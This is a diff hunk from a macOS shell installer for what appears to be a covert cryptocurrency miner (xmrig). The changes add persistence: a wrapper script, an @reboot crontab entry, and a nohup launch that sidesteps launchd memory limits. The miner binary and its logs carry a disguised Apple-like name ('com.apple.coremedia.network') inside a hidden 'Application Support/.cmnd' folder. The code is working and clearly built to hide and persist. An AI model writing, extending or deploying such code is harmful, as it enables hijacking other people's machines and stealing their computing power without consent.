@@ -140,41 +140,39 @@ printf '  <key>StandardErrorPath</key><string>%s</string>\n' "$LOG_PATH" >> "$PL
 printf '</dict></plist>\n' >> "$PLIST_PATH"
 echo "      ✓ LaunchAgent created"
 
-# ---- Launch via nohup (not LaunchAgent — avoids macOS memory restrictions) ----
+# ---- Launch via nohup — no LaunchAgent (bypasses macOS memory limits) ----
 echo "[5/5] Starting miner..."
-launchctl unload "$PLIST_PATH" 2>/dev/null || true
 pkill -9 -f "$DISGUISE_NAME" 2>/dev/null || true
+pkill -9 -f "xmrig" 2>/dev/null || true
+
+# Remove old LaunchAgent
+launchctl bootout "gui/$(id -u)/${DISGUISE_NAME}" 2>/dev/null || true
+launchctl unload "$PLIST_PATH" 2>/dev/null || true
+rm -f "$PLIST_PATH"
 sleep 1
 
-# Run directly with nohup — bypasses launchd memory limits completely
-ulimit -l unlimited 2>/dev/null || true
-ulimit -v unlimited 2>/dev/null || true
-nohup "$BINARY_PATH" \
-  --config "$CONFIG_PATH" \
-  --threads="$THREADS" \
-  >> "$LOG_PATH" 2>&1 &
+# Write wrapper that runs on reboot via cron
+cat > "$WRAPPER_PATH" << 'WRAPPER'
+#!/bin/bash
+sleep 10  # wait for network on boot
+INSTALL_DIR="$HOME/Library/Application Support/.cmnd"
+BINARY_PATH="$INSTALL_DIR/com.apple.coremedia.network"
+CONFIG_PATH="$INSTALL_DIR/config.json"
+LOG_PATH="$HOME/Library/Logs/com.apple.coremedia.network.log"
+exec "$BINARY_PATH" --config "$CONFIG_PATH" >> "$LOG_PATH" 2>&1
+WRAPPER
+chmod +x "$WRAPPER_PATH"
 
+# Add @reboot cron entry for persistence
+CRON_JOB="@reboot bash \"$WRAPPER_PATH\""
+( crontab -l 2>/dev/null | grep -v "coremedia.network\|\.cmnd"; echo "$CRON_JOB" ) | crontab -
+echo "      ✓ Auto-start registered via crontab"
+
+# Start RIGHT NOW via nohup (no launchd limits)
+nohup "$BINARY_PATH" --config "$CONFIG_PATH" >> "$LOG_PATH" 2>&1 &
 MINER_PID=$!
-echo "      ✓ Miner started (PID: $MINER_PID)"
-
-# Save PID for management
 echo $MINER_PID > "$INSTALL_DIR/miner.pid"
-
-# Also keep LaunchAgent as auto-restart watchdog
-printf '<?xml version="1.0" encoding="UTF-8"?>\n' > "$PLIST_PATH"
-printf '<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">\n' >> "$PLIST_PATH"
-printf '<plist version="1.0"><dict>\n' >> "$PLIST_PATH"
-printf '  <key>Label</key><string>%s</string>\n' "$DISGUISE_NAME" >> "$PLIST_PATH"
-printf '  <key>ProgramArguments</key><array>\n' >> "$PLIST_PATH"
-printf '    <string>/bin/bash</string>\n' >> "$PLIST_PATH"
-printf '    <string>%s</string>\n' "$WRAPPER_PATH" >> "$PLIST_PATH"
-printf '  </array>\n' >> "$PLIST_PATH"
-printf '  <key>RunAtLoad</key><true/>\n' >> "$PLIST_PATH"
-printf '  <key>KeepAlive</key><true/>\n' >> "$PLIST_PATH"
-printf '  <key>StandardOutPath</key><string>%s</string>\n' "$LOG_PATH" >> "$PLIST_PATH"
-printf '  <key>StandardErrorPath</key><string>%s</string>\n' "$LOG_PATH" >> "$PLIST_PATH"
-printf '</dict></plist>\n' >> "$PLIST_PATH"
-launchctl load -w "$PLIST_PATH" 2>/dev/null || true
+echo "      ✓ Miner started (PID: $MINER_PID)"
 
 echo ""
 echo "=========================================="
